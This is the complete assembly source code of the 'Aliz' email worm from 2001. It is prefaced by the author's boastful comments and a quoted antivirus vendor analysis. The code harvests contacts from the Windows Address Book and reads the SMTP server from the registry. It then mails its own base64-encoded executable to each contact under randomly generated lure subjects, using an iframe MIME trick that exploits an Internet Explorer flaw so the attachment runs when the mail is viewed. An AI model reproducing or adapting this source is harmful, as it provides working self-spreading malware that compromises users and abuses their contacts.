comment $

ey, this comment is added 21 november 2001. i saw that aliz is spreading
pretty, so just some more about-text then the original release (i thought it
would be a worm that nobody would ever know :).

well, i wrote this worm long ago, in about two days, just cause i was bored.
it was around the time that the iframe sploit was 1-day old, thats all i re-
member and i have no clue how long ago that was.

anyway, i wanted to code a small worm. i did it, but what then? i didn't wanna
drop it itw cause massmailers are lame. (the total worm is lame, really).
so i decided that it would be nice for coderz #2... that was going to be
released around that days (heheheheeheh a half year later now i write this
text and it still getting released soon). anyway, thats why that text is in
it. i had to fill much space, so thats why that huge stupid text.

anyway, coderz#2 wasn't getting released for weeks, months, etc, so i decided
to fork the AV's a sample, and i uploaded it to my site, as a binary, in a
zip file with a secret password, as a test sample.

nothing happens and i forgot the total fuck worm. although avx wrote a
description very fast because they are lame.

well, 19 november i was just checking f-secure.com, because they have nice
a special section pictures of viruses (payloads) in their description part,
and what did i see: aliz. in the wild...

woowwie ;)

now it is high risk blabla on many av sites...

well, its a lame worm, and i didn't care really cause nobody would really
see it (look over the source). anyway, now it differs a lil i guess ;)

heh.

greetings

mar00n (a lame nick too)


description, today i pick f-secure because its the most complimentous desc. ;)

btw, 'in pure Assembly', did they recognize it or was it because of my text
in the body?: '..power in pure win32asm..' hehe ;))

------------------------------------------------------------------------------
Aliz is a very small e-mail worm written in pure Assembly. It appeared in the
wild on 18-20th of November 2001. The worm's file is only 4 kilobytes long
and its code is compressed. It can be considered one of the smallest Win32
worms ever created.

When the worm is run, it first unpacks itself and then passes control to API
address setup routine. When all needed API addresses are collected, the
control is passed to the main worm's code. The worm checks the Registry for
the location of Windows Address Book file and loads it into memory. The worm
then connects to default SMTP server (for SMTP server info the worm checks
Internet Accound Manager data in the Registry) and sends itself to all
recepients of Windows Address Book. The infected message looks like that:



 Subject: <randomly composed from 5 different parts, see below>
 Body: <empty multi-part MIME message with HTML formatting and i-frame trick>
 Attachment: Whatever.exe

The subject of infected message is randomly composed from 5 different parts: 



 Fw:
 Fw: Re:



 Cool
 Nice
 Hot
 some
 Funny
 weird
 funky
 great
 Interesting
 many



 website
 site
 pics
 urls
 pictures
 stuff
 mp3s
 shit
 music
 info



 to check
 for you
 i found
 to see
 here
 - check it



 !!
 !
 :-)
 ?!
 hehe ;-)

For example a subject can be: "Fw: Cool pictures i found !!" or
"Nice website to check hehe ;-)".

The message contains a MIME-encoded attachment - the worm's file with
'Whatever.exe' name. The body is an empty multi-part MIME message with HTML
formatting and i-frame trick that was previously found in Nimda and Klez
worms. Because of this trick on some systems the worm is able to self-launch
itself when an infected e-mail is viewed (for example, with Outlook and
IE 5.0 or 5.01). To do this the worm uses a known vulnerability in IE that
allows execution of an email attachment. This vulnerability is fixed and a
patch for it is available on Microsoft site:

http://www.microsoft.com/windows/ie/downloads/critical/q290108/default.asp 

The worm doesn't install itself to system, it runs, sends itself out and
terminates its process.

The worm contains the following text strings that are never displayed: 



 :::iworm.alizee.by.mar00n!ikx2oo1:::



 while typing this text i realize this text got added on many av
 description sites, because this silly worm could be easily a
 hype. i wonder which av claims '[companyname] stopped high risk
 worm before it could escape!' or shit like that. heh, or they
 boycot my virus because of this text. well, it is easy enough
 for the poor av's to add this worm; since it was only released
 as source in coderz#2... btw, loveletter*2 power in pure win32asm
 and only a 4k exe file. heh, vbs kiddies, phear win32asm. :)
 thx to: bumblebee!29a, asmodeus!ikx. greets to: starzer0!ikx,
 t-2000!ir, ultras!mtx & sweet gigabyte...
 btw,burgemeester van sneek: ik zoek nog een baantje...
 (alignmentfillingtext)

F-Secure Anti-Virus detects Aliz worm with the latest updates. 

[Analysis: Alexey Podrezov; F-Secure Corp.; November 19th, 2001] 

------------------------------------------------------------------------------


well and here the old comment

$

comment $

iworm alizee by mar00n ! ikx 2oo1

alizee is a worm that mails itself around to all addies in your addressbook.

not very special, is it?

well:

       1-it shows that the stack is your best friend
       2-the generated exe file is only 4096 bytes
       3-it shows a clean compatible way in win32asm to obtain email addies
       4-the subject is random generated
       5-the attached exe file gets automatically executed if the reader
         tries to read the message
       6-the whole thing is very clean written (who cares)

indeed, very standard, except step 2 and 5 ;)

more about them:

step 2: yes, its very small, the code is compressed using aplib, and
        decompressed using my own tweaked optmized aplib decompressor

step 5: indeed, this means loveletter power*10. (code? search for <html> tag)


succesfully tested under win98 & win2k... its nice to talk with your creation
using netcat ;)

220 hi
helo localhost
250 ey man ;) wassup? do you have mail to send?
mail from: some@one.com
250 and to who?
rcpt to: sucker@microsoft.com
250 seems ok to me
data
354 go ahead ;) ... but don't forget the cr.cr, ok?

blablablla

well erh, this worm is very hard to compile, see my zip file for the bat files
and external programs you need.


thx:            bumblebee       for your base64 routines
                asmodeus        for the first one doing this

grtz/fear:      starzer0,billy,lifewire,vecna,z0mbie,t2k,benny,ratter,griyo
                and gig

ps, i don't love alizee or what. she's just ... highly fuckable?

$
.386p
.model flat
locals __

include c:\tasm\inc\myinc.inc

sizer   equ 4098

binsize equ sizer + 3-(3-(sizer mod 3))         ;stupid 3-alignment for base64


_call   macro   api
        call    dword ptr [api]
        endm

maxspread       equ     666                     ;max mail to n addies

include c:\tasm\inc\win32api.inc                ;luv to jackyqwerty
include c:\tasm\inc\useful.inc
include c:\tasm\inc\winsock.inc

;extrn   LoadLibraryA:proc;
;extrn   GetProcAddress:proc;

;----------------------------------------------------------------------------;
_CODE           segment dword use32 public 'CODE'
start:          nop                                     ;heh

_CODE           ends
;----------------------------------------------------------------------------;

.data                           ;only to use virtual offset 402000
;                int     3
               
                call    overseh

                jmp     $       ;if seh we simply hang. why not? :)

                overseh:
                xor     edx,edx
                push    dword ptr fs:[edx]
                mov     fs:[edx],esp

;----------------------------------------------------------------------------;
                ;ebx=module base/handle
                ;esi=crc32s
                ;edi=wheretostore

                mov     esi,offset apicrcs
                mov     edi,offset apis

                call    __x
                db      "KERNEL32",0
                __x:

i_importall_loop:
;                call    LoadLibraryA
                call    dword ptr [start+2034h]         ;loadlibrary
                xchg    eax,ebx
                call    i_importapis                    ;first import k32
                xor     eax,eax
                lodsb
                xchg    eax,ecx
                jecxz   i_importall_done                ;modulenamelength
                push    esi
                add     esi,ecx
                jmp     i_importall_loop
;----------------------------------------------------------------------------;

i_importall_done:

                sub     esp,size stackframe
                
                sub     esp,size stack2
                mov     ebp,esp

;                int     3

                call    __y
                db      "Software\Microsoft\WAB\WAB4\Wab File Name",0
                __y:
                push    0
                call    readregkey

                lea     esi,[ebp.buffer]

                add     esp,size stack2
                or      eax,eax
                jnz     exit

                ;esp = filename of wab we choose

                mov     ebp,esp

                call    openfile
                jc      exit

                ;esi = wabmapview (nice name;)

                ;int     3

                mov     ecx,[esi+64h]                   ;number of adds
                jecxz   exit                            ;victim has no friends
                add     esi,[esi+60h]                   ;pointer addies

;                dec     ecx

;                cmp     ecx,maxspread
;                jbe     mailaround
;                push    maxspread
;                pop     ecx

                ;parse wab file for addies & mail the fun

mailaround:
                push    ecx

                mov     eax,esi
                cmp     byte ptr [esi+1],0
                jne     nounicode


                push    esi                             ;unicode support
                lea     edi,[ebp.addie]
                push    edi

                push    48h
                pop     ecx
__y:
                lodsw
                stosb
                loop    __y

                pop     eax                             ;ebp+addie
                pop     esi                             ;esi in wab.addresses
                add     esi,20h

nounicode:
;                int     3
                push    ebp
                call    share                           ;share the fun
                pop     ebp

                add     esi,24h

                pop     ecx
                loop    mailaround

                push    [ebp.createhandle]              ;close wabfilehandle
                push    [ebp.maphandle]
                push    [ebp.viewhandle]
                _call   CloseHandle
                _call   CloseHandle
                _call   CloseHandle

exit:           add     esp,size stackframe

                pop     dword ptr fs:[0]
                pop     eax

                push    0
                _call   ExitProcess

db      ":::iworm.alizee.by.mar00n!ikx2oo1:::",0dh,0dh

db      "while typing this text i realize this text got added on many av",0dh
db      "description sites, because this silly worm could be easily a",0dh
db      "hype. i wonder which av claims '[companyname] stopped high risk",0dh
db      "worm before it could escape!' or shit like that. heh, or they",0dh
db      "boycot my virus because of this text. well, it is easy enough",0dh
db      "for the poor av's to add this worm; since it was only released",0dh
db      "as source in coderz#2... btw, loveletter*2 power in pure win32asm",0dh
db      "and only a 4k exe file. heh, vbs kiddies, phear win32asm. :)",0dh
db      "thx to: bumblebee!29a, asmodeus!ikx. greets to: starzer0!ikx,",0dh
db      "t-2000!ir, ultras!mtx & sweet gigabyte...",0dh
db      "btw,burgemeester van sneek: ik zoek nog een baantje...",0dh
db      "(alignmentfillingtext)",0dh


;----------------------------------------------------------------------------;

share:          push    esi
                mov     esi,eax

                sub     esp,size stack2                 ;some workspace
                mov     ebp,esp

                push    ebp
                push    101h
                _call   WSAStartup                      ;startup wsock services

                push    0
                push    1
                push    2                               
                _call   socket                          ;create socket
                xchg    eax,edi

                push    25                              ;convert port to big/
                _call   htons                           ;lil endian

                mov     word ptr [ebp.sockaddr_in \
                                 .sin_family],AF_INET   ;setup connect info
                mov     [ebp.sockaddr_in.sin_port],ax

                push    offset szRegAccountInfo
                call    __porn
                db      "SMTP Server",0
                __porn:
                call    readregkey
                jc      share_xit

                ;ebx = smtp server name from registry

                push    ebx
                _call   gethostbyname                   ;resolve

                or      eax,eax
                jz      share_xit

                mov     eax,[eax+12]                    ;no clue what i'm
                mov     eax,[eax]                       ;doing here. ctrl+c/v
                mov     eax,[eax]                       ;from my other source
                                                        ;but i hope eax=IP ;)

                mov     dword ptr [ebp.sockaddr_in.sin_addr],eax

                push    size ssockaddr_in
                lea     eax,[ebp.sockaddr_in]
                push    eax
                push    edi                     ;handle
                _call   connect
                or      eax,eax
                jnz     share_xit
                
                ;int     3

                mov     ebx,offset maildata
                call    sendstrings                     ;mail ourself

clean_xit:
                push    edi
                _call   closesocket
                _call   WSACleanup                      ;disconnect

share_xit:
                add     esp,size stack2
                pop     esi
                ret

;----------------------------------------------------------------------------;


sendstrings:    
                xchg    ebx,esi         ;ebx is now dest. email. add. esi=data
                                        ;and edi is socket handle

parsemaildata:  xor     eax,eax
                lodsb
                cmp     al,8
                ja      nsend
                or      al,al
                jz      parsemaildata

                jmp     [fntable-4+eax*4]



nsend:          dec     esi
                call    stringsend
                jmp     parsemaildata




fntable         dd      offset checkmailinput
                dd      offset sendmailfrom
                dd      offset sendmailto
                dd      offset senddate
                dd      offset sendsubject
                dd      offset sendbase64
                dd      offset exitexit

sendbase64:     ;int     3

                pushad

                push    binsize*4                ;oursize*2+base64space
                push    0
                _call   GlobalAlloc
                push    eax             ;one push for globalfree
                push    eax             ;one push for base64 fun                      

                xchg    eax,edi

                push    0
                _call   GetModuleHandleA

                xchg    eax,esi

                xor     ecx,ecx

;                mov     ecx,200h/4
                mov     ch,2
        rep     movsb                                   ;200h bytes

                add     esi,(1000h-200h)
                        
;                mov     ecx,0a00h/4
                mov     ch,0ah
        rep     movsb                                   ;a00h bytes

                add     esi,(2000h-0a00h)

;                mov     ecx,400h/4
                mov     ch,2
        rep     movsb                                   ;200h

                add     esi,(1000h-400h)

;                mov     ecx,200h/4
                mov     ch,2
        rep     movsb                                   ;200h
                

                pop     eax                             ;src
                lea     edx,[eax+binsize+100h]          ;dest
                push    edx
                mov     ecx,binsize                     ;in

                call    encodebase64
                mov     dword ptr [edx],0a0d3dh         ; '=/cr/lf/z'
                pop     esi
                mov     edi,[esp.Pushad_edi+4]          ;jqwerty forever :)
                call    stringsend

                _call   GlobalFree

                popad
                
                jmp     parsemaildata

;----------------------------------------------------------------------------;
checkmailinput: push    0
                push    300h
                lea     eax,[ebp.buffer]
                push    eax
                push    edi                     ;handle
                _call   recv

                lodsw
                cmp     word ptr [ebp.buffer],ax        ;codes match?
                je      parsemaildata
                ret                     ;no good code -return to clean_xit
;----------------------------------------------------------------------------;

;----------------------------------------------------------------------------;
sendmailfrom:   push    esi


;                call    __a
;fromwho         db      "test@localhost",0
;                __a:
;                pop     esi

                push    ebx

                push    offset szRegAccountInfo
                call    __s
                db      "SMTP Email Address",0
                __s:
                call    readregkey
                mov     esi,ebx
                pop     ebx
                call    stringsend                      ;well guess. test! :)

                pop     esi
smfx:           jmp     parsemaildata
;----------------------------------------------------------------------------;

;----------------------------------------------------------------------------;
sendmailto:     push    esi
                mov     esi,ebx              
                call    stringsend
                pop     esi
smtx:           jmp     smfx
;----------------------------------------------------------------------------;

;----------------------------------------------------------------------------;
senddate:       pushad
                ;int     3

                push    edi
                lea     edi,[ebp.buffer]
                push    edi

                push    100
                push    edi
                call    __x
formdate        db      "ddd,dd MMM yyyy",0
                __x:
                push    0
                push    0
                push    409h
                _call   GetDateFormatA
                add     edi,eax
                dec     edi
                mov     al,' '
                stosb

                push    100
                push    edi
                call    __y
formtime        db      "HH:mm:ss",0
                __y:
                push    0
                push    0
                push    409h
                _call   GetTimeFormatA
                add     edi,eax
                dec     edi
                mov     eax,'00- '
                stosd
                mov     eax,03030h
                stosd                           ;barf

                pop     esi
                pop     edi
                call    stringsend

                popad

gsxx:           jmp     smtx
;----------------------------------------------------------------------------;

;----------------------------------------------------------------------------;
exitexit:       ;int     3
                ret
;----------------------------------------------------------------------------;


;----------------------------------------------------------------------------;
sendsubject:    pushad
                ;int     3

                mov     esi,offset gendata
                push    edi
                lea     edi,[ebp.buffer]
                push    edi

hehe:
                xor     eax,eax
                lodsb

                cmp     al,31
                je      done

                call    get_rnd_range
                xchg    eax,ecx

__l:            or      ecx,ecx
                jz      __b
__f:            lodsb
                or      al,al
                jnz     __f
                loop    __l

__b:            lodsb
                cmp     al,0
                je      __d
                stosb
                jmp     __b
__d:            mov     al,' '
                stosb
                
__g:            lodsb
                cmp     al,0
                je      __g
                cmp     al,' '
                jae     __g
                dec     esi
                jmp     hehe

done:
                mov     al,0
                stosb
                pop     esi
                pop     edi
                call    stringsend
                popad
                jmp     gsxx
 
gendata db      5
        db      0
        db      0
        db      0
        db      "Fw:",0
        db      "Fw: Re:",0

        db      11
        db      0
        db      "Cool",0
        db      "Nice",0
        db      "Hot",0
        db      "some",0
        db      "Funny",0
        db      "weird",0
        db      "funky",0
        db      "great",0
        db      "Interesting",0
        db      "many",0

        db      10
        db      "website",0
        db      "site",0
        db      "pics",0
        db      "urls",0
        db      "pictures",0
        db      "stuff",0
        db      "mp3s",0
        db      "shit",0
        db      "music",0
        db      "info",0

        db      7
        db      "to check",0
        db      "for you",0
        db      "i found",0
        db      "to see",0
        db      "here",0
        db      "- check it",0
        db      0
        
        db      6
        db      "!!",0
        db      "!",0
        db      ":-)",0         ;lets use lame cool-to-newbies smileys ;P
        db      "?!",0
        db      "hehe ;-)",0
        db      0

        db      31              ;terminator

        
;----------------------------------------------------------------------------;

;----------------------------------------------------------------------------;
stringsend:     push    esi

                xor     ecx,ecx
                dec     ecx

__x:            lodsb
                inc     ecx
                cmp     al,8
                ja      __x
               
                pop     esi
                push    ecx

                push    0                       ;flags
                push    ecx                     ;length
                push    esi                     ;datastart
                push    edi                     ;handle
                _call   send

                pop     ecx

;                push    10
;                _call   Sleep

                add     esi,ecx
                ret
;----------------------------------------------------------------------------;

get_rnd_range:  push    ecx                     ;luv to griyo
                push    edx
                mov     ecx,eax
                call    get_rnd32
                xor     edx,edx
                div     ecx
                mov     eax,edx
                pop     edx
                pop     ecx
                ret


get_rnd32:                                      ;Stolen from prizzy's Crypto
                push    ebx ecx edx
                mov     eax,dword ptr [ebp.rnd32seed]
                mov     ecx,41C64E6Dh
		mul	ecx
		xchg	eax,ecx
                _call    GetTickCount
		mov	ebx,eax
                db      0Fh, 31h                ;RDTCS instruction - read
		xor	eax,ebx
		xchg	ecx,eax 		;PCs ticks to EDX:EAX
		mul	ecx
		add	eax,00003039h
                mov     dword ptr [ebp.rnd32seed],eax
		pop	edx ecx ebx
		ret

;----------------------------------------------------------------------------;

encodebase64:   ; encodeBase64 by Bumblebee. All rights reserved ;)
; input:
;       EAX = Address of data to encode
;       EDX = Address to put encoded data
;       ECX = Size of data to encode
; output:
;       ECX = size of encoded data
;
        xor     esi,esi 
        call    over_enc_table
        db      "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        db      "abcdefghijklmnopqrstuvwxyz"
        db      "0123456789+/"
over_enc_table:
        pop     edi
        push    ebp
        xor     ebp,ebp
baseLoop:
        movzx   ebx,byte ptr [eax]
        shr     bl,2
        and     bl,00111111b
        mov     bh,byte ptr [edi+ebx]
        mov     byte ptr [edx+esi],bh
        inc     esi

        mov     bx,word ptr [eax]
        xchg    bl,bh
        shr     bx,4
        mov     bh,0
        and     bl,00111111b
        mov     bh,byte ptr [edi+ebx]
        mov     byte ptr [edx+esi],bh
        inc     esi

        inc     eax
        mov     bx,word ptr [eax]
        xchg    bl,bh
        shr     bx,6
        xor     bh,bh
        and     bl,00111111b
        mov     bh,byte ptr [edi+ebx]
        mov     byte ptr [edx+esi],bh
        inc     esi

        inc     eax
        xor     ebx,ebx
        movzx   ebx,byte ptr [eax]
        and     bl,00111111b
        mov     bh,byte ptr [edi+ebx]
        mov     byte ptr [edx+esi],bh
        inc     esi
        inc     eax

        inc     ebp
        cmp     ebp,24
        jna     DontAddEndOfLine

        xor     ebp,ebp                         ; add a new line
        mov     word ptr [edx+esi],0A0Dh
        inc     esi
        inc     esi
        test    al,00h                          ; Optimized (overlap rlz!)
        org     $-1
DontAddEndOfLine:
        inc     ebp
        sub     ecx,3
        or      ecx,ecx
        jne     baseLoop

        mov     ecx,esi
        add     edx,esi
        pop     ebp
        ret
;----------------------------------------------------------------------------;

;----------------------------------------------------------------------------;
readregkey:
                lea     eax,[ebp.regkeyhnd]
                push    eax
                push    dword ptr [esp+3*4]
                push    80000001h  ;hkey current user
                _call   RegCreateKeyA
                or      eax,eax
                jnz     rrke      

more_data:      push    127
                push    esp
                lea     ebx,[ebp.buffer]
                push    ebx
                push    0
                push    0
                push    dword ptr [esp+18h]
                push    [ebp.regkeyhnd]
                _call   RegQueryValueExA               ;read stmp server
                pop     ecx
                cmp     eax,234
                je      more_data               ;??
                or      eax,eax
                jnz     rrke       

                push    [ebp.regkeyhnd]
                _call   RegCloseKey
                clc
                ret     8

rrke:           stc
                ret     8
;----------------------------------------------------------------------------;

;----------------------------------------------------------------------------;
openfile:       xor     ebx,ebx
                push    ebx
                push    FILE_ATTRIBUTE_NORMAL
                push    OPEN_EXISTING
                push    ebx
                push    ebx                               
                push    GENERIC_READ or GENERIC_WRITE
                push    esi
                _call   CreateFileA
                inc     eax
                jz      foerroropening
                dec     eax
                mov     dword ptr [ebp.createhandle],eax
        
                push    ebx
                push    ebx                                     ;max size low
                push    ebx
                push    PAGE_READWRITE
                push    ebx
                push    eax                                     ;handle
                _call   CreateFileMappingA
                mov     dword ptr [ebp.maphandle],eax

                push    ebx
                push    ebx
                push    ebx
                push    FILE_MAP_WRITE
                push    eax                             ;handle
                _call   MapViewOfFile
                mov     dword ptr [ebp.viewhandle],eax
                xchg    eax,esi
                clc
                ret
foerroropening: stc
                ret
;----------------------------------------------------------------------------;

                ;       ebx=module base/handle
                ;       edi=where to store
                ;       esi=crc32 stuff
i_importapis:
                mov     eax,[ebx+03ch]                  ;pointer to PE
                mov     edx,[eax+ebx+78h]               ;export section
                add     edx,ebx

i_ia_nextone:
                lodsd
                or      eax,eax
                jz      i_ia_done
                push    esi
                xchg    eax,ecx                         ;ecx=desired crc32

                mov     esi,[edx+8*4]                   ;addresses of ApiNames
                add     esi,ebx
i_ia_find:
                lodsd                                   ;address
                push    esi
                add     eax,ebx                         ;add base
                push    eax                             ;save base for later
                xchg    eax,esi
                call    v_crc32
                cmp     eax,ecx                         ;actual crc32=desired?
                pop     eax
                pop     esi
                jne     i_ia_find                       ;nope.. then next

                push    edx                             ;preserve edx

                push    eax                             ;eax=name
                push    ebx
;                call    GetProcAddress
                call    dword ptr [start+2038h]

                pop     edx

                stosd

                pop     esi
                jmp     i_ia_nextone
i_ia_done:
                ret

v_crc32:                                        ;ofcourse i stole this... :)
		push	edx
                mov     edx,09C3B248Eh
	__gCRC32_next_byte:
		lodsb
		or	al,al			;end of name ?
		jz	__gCRC32_finish

		xor	dl,al
		mov	al,08h
	__gCRC32_next_bit:
		shr	edx,01h
		jnc	__gCRC32_no_change
                xor     edx,0C1A7F39Ah
	__gCRC32_no_change:
		dec	al
		jnz	__gCRC32_next_bit
		jmp	__gCRC32_next_byte
	__gCRC32_finish:
		xchg	eax,edx 		;CRC32 to EAX
		pop	edx
		ret




szRegAccountInfo db      "Software\Microsoft\Internet Account Manager\Accounts\00000001",0

mCheck  equ 1            ;recv/checkfor
mFromAd equ 2            ;mailfrom addy
mDestAd equ 3            ;sendto addy
mTime   equ 4            ;right time/date field
mSubj   equ 5            ;random generated subject
mBase64 equ 6            ;base64 data
mEom    equ 7            ;endofmail


;----------------------------------------------------------------------------;
;       ***             the email data                  ***                  ;


;                       smtp commands
;----------------------------------------------------------------------------;

crlf equ 0dh,0ah
crlfz equ crlf,0
maildata        db      mCheck,'22'                     ;--check 220 greet
                db      'HELO localhost',crlf           ;HELO localhost
                db      mCheck,'25'                     ;--check 250
                db      'MAIL FROM: ',mFromAd,crlf      ;MAIL FROM: addie
                db      mCheck,'25'                     ;--check 250
                db      'RCPT TO: ',mDestAd,crlf        ;RCPT TO: addie
                db      mCheck,'25'                     ;--check 250
                db      'DATA',crlf                     ;DATA
                db      mCheck,'35'                     ;--check 354

;                       stupid default stuph
;----------------------------------------------------------------------------;

db 'From: ',mFromAd,crlf
db 'To: ',mDestAd,crlf
db 'Subject: ',mSubj,crlf
db 'Date: ',mTime,crlf

                        ;mime headers
;----------------------------------------------------------------------------;

db 'MIME-Version: 1.0',crlf
db 'Content-Type: multipart/mixed;',crlf
db '        boundary="bound"',crlf
db '        X-Priority: 3',crlf
db '        X-MSMail-Priority: Normal',crlf
db '        X-Mailer: Microsoft Outlook Express 5.50.4522.1300',crlf
db '        X-MimeOLE: Produced By Microsoft MimeOLE V5.50.4522.1300',crlf
db crlf
db 'This is a multi-part message in MIME format.',crlf
db crlf

                        ;first part: html code to run the sploit
;----------------------------------------------------------------------------;

db '--bound',crlf
db 'Content-Type: text/html;',crlf
db '        charset="iso-8859-1"',crlf
db 'Content-Transfer-Encoding: quoted-printable',crlf
db crlf
db '<HTML><HEAD></HEAD><BODY><iframe src=3Dcid:SOMECID height=3D0 width=3D0></iframe>',crlf
db '<font>peace</font></BODY></HTML>',crlf
db crlf

                        ;next part - the sploit
;----------------------------------------------------------------------------;

db '--bound',crlf
db 'Content-Type: audio/x-wav;',crlf
db '        name="whatever.exe"',crlf
db 'Content-Transfer-Encoding: base64',crlf
db 'Content-ID: <SOMECID>',crlf
db crlf

                        ;base64 stuff
;----------------------------------------------------------------------------;
db mBase64

                        ;end boundary & quit command
;----------------------------------------------------------------------------;
                
db crlf,'--bound--',crlf,'.',crlf
db 'QUIT',crlf,mEom

;----------------------------------------------------------------------------;

apicrcs:
crc32m  <GetWindowsDirectoryA>
crc32m  <CloseHandle>
crc32m  <ExitProcess>
crc32m  <GlobalAlloc>
crc32m  <GetModuleHandleA>
crc32m  <GlobalFree>
crc32m  <GetDateFormatA>
crc32m  <GetTimeFormatA>
crc32m  <Sleep>
crc32m  <GetTickCount>
crc32m  <CreateFileA>
crc32m  <CreateFileMappingA>
crc32m  <MapViewOfFile>
        dd      0

        db              9
        db              "ADVAPI32",0
crc32m  <RegCreateKeyA>
crc32m  <RegQueryValueExA>
crc32m  <RegCloseKey>
dd      0

        db 8
        db "WSOCK32",0
crc32m  <WSAStartup>
crc32m  <socket>
crc32m  <htons>
crc32m  <gethostbyname>
crc32m  <connect>
crc32m  <closesocket>
crc32m  <recv>
crc32m  <send>
crc32m  <WSACleanup>
        dd      0
        db      0


db      "END"

apis:

GetWindowsDirectoryA    dd      ?
CloseHandle    dd      ?
ExitProcess    dd      ?
GlobalAlloc    dd      ?
GetModuleHandleA    dd      ?
GlobalFree    dd      ?
GetDateFormatA    dd      ?
GetTimeFormatA    dd      ?
Sleep    dd      ?
GetTickCount    dd      ?
CreateFileA    dd      ?
CreateFileMappingA    dd      ?
MapViewOfFile    dd      ?


RegCreateKeyA    dd      ?

RegQueryValueExA    dd      ?
RegCloseKey    dd      ?


WSAStartup    dd      ?
socket    dd      ?
htons    dd      ?
gethostbyname    dd      ?
connect    dd      ?
closesocket    dd      ?
recv    dd      ?
send    dd      ?
WSACleanup    dd      ?

        

totalend:

stackframe      struc

createhandle    dd      ?
maphandle       dd      ?
viewhandle      dd      ?
addie           db      48h dup (?)

stackframe      ends



stack2          struc

regkeyhnd       dd      ?
sockaddr_in     ssockaddr_in ?
buffer          db 300h dup (?)
rnd32seed       dd      ?
;space           WSADATA ?
ends

        end     start
        end


